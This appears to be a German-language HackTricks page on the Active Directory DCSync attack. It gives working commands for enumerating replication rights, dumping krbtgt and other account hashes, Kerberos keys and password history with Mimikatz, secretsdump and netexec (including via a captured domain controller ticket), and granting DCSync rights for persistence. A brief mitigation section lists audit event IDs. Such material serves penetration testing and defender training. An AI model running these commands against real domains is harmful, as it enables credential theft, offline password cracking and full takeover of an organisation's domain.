# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die Berechtigung **DCSync** setzt voraus, dass folgende Berechtigungen für die Domäne selbst vorhanden sind: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controller dazu auf, Informationen zu replizieren**. Dabei kommt das Directory Replication Service Remote Protocol (MS-DRSR) zum Einsatz. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht abgeschaltet oder deaktiviert werden.
- Standardmäßig verfügen nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** über die erforderlichen Berechtigungen.
- In der Praxis benötigt **vollständiges DCSync** die Berechtigungen **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** für den Domänennamenskontext. `DS-Replication-Get-Changes-In-Filtered-Set` wird häufig zusammen mit diesen Berechtigungen delegiert, ist allein jedoch eher für die Synchronisierung **vertraulicher / RODC-gefilterter Attribute** relevant (zum Beispiel Geheimnisse im Legacy-LAPS-Stil) als für einen vollständigen krbtgt-Dump.<sup>[[2]](#references)</sup>
- Wenn Kontokennwörter mit reversibler Verschlüsselung gespeichert werden, kann Mimikatz das Kennwort im Klartext zurückgeben.

### Aufzählung

Prüfe mit `powerview`, wer über diese Berechtigungen verfügt:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Wenn du dich auf **nicht standardmäßige Sicherheitsprinzipale** mit DCSync-Rechten konzentrieren möchtest, filtere die integrierten Gruppen mit Replikationsrechten heraus und überprüfe nur unerwartete Berechtigungsempfänger:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Lokal ausnutzen

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Remote Exploitieren

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktische Beispiele mit eingeschränktem Geltungsbereich:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync mit einem erfassten DC-Machine-TGT (ccache)

Wenn Sie einen Dienst auf einem Domain Controller überprüfen, unterscheiden Sie zwischen seiner lokalen Dienstidentität und seiner Netzwerkidentität. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), dass virtuelle SQL Server-Konten (`NT SERVICE\...`) auf Netzwerkressourcen als Computerkonto des Hosts zugreifen. Auf einem Domain Controller kann dadurch das DC-Maschinenkonto für die Überprüfung von Replikationsrechten relevant sein. Ein Zugriff auf einen Dienst allein belegt jedoch weder, dass ein exportierbares Maschinen-TGT vorhanden ist, noch, dass eine nutzbare DCSync-Authentifizierung möglich ist. Überprüfen Sie die tatsächliche Dienstidentität, den ausgehenden Authentifizierungskontext, verfügbare Tickets oder Zugangsdaten sowie die effektiven Replikationsrechte, bevor Sie dies als möglichen Pfad betrachten.

In Szenarien mit unconstrained delegation im Export-Modus können Sie ein Maschinen-TGT eines Domain Controllers erfassen (z. B. `DC1$@DOMAIN` für `krbtgt@DOMAIN`). Anschließend können Sie diesen ccache verwenden, um sich als DC zu authentifizieren und DCSync ohne Passwort durchzuführen.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Betriebshinweise:

- **Impacket's Kerberos-Pfad greift zuerst auf SMB zu**, bevor der DRSUAPI-Aufruf erfolgt. Wenn die Umgebung **SPN target name validation** erzwingt, schlägt möglicherweise ein vollständiger Dump fehl: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Fordere in diesem Fall entweder zuerst ein Service-Ticket für **`cifs/<dc>`** des Ziel-DCs an oder verwende **`-just-dc-user`** für das Konto, das du sofort benötigst.
- Wenn du nur über niedrigere Replikationsrechte verfügst, kann die Synchronisierung im LDAP-/DirSync-Stil dennoch **vertrauliche** oder **RODC-gefilterte** Attribute offenlegen (zum Beispiel das ältere `ms-Mcs-AdmPwd`), ohne dass eine vollständige krbtgt-Replikation erforderlich ist.<sup>[[2]](#references)</sup>

`-just-dc` erstellt 3 Dateien:

- eine mit den **NTLM-Hashes**
- eine mit den **Kerberos-Schlüsseln**
- eine mit Klartextpasswörtern aus der NTDS für alle Konten, bei denen [**reversible Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Benutzer mit aktivierter reversibler Verschlüsselung erhältst du mit

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistenz

Wenn Sie ein Domänenadministrator sind, können Sie mithilfe von PowerView jedem Benutzer diese Berechtigungen erteilen:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux-Operatoren können dasselbe mit `bloodyAD` tun:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Anschließend kannst du überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden, indem du in der Ausgabe von (die Namen der Berechtigungen sollten im Feld "ObjectType" zu sehen sein) danach suchst:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Mitigation

- Security Event ID 4662 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Ein Vorgang wurde an einem Objekt ausgeführt<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
- Security Event ID 4670 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Berechtigungen für ein Objekt wurden geändert
- AD ACL Scanner – ACL-Berichte erstellen und vergleichen. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket-Änderungsprotokoll](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replikationsberechtigungen „Get-Changes“ und „Get-Changes-In-Filtered-Set“ nutzen](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Passwort-Hashes vom Domain Controller auslesen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL-Zugangsdaten → gezieltes Kerberoasting → uneingeschränkte Delegierung → DCSync zum DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
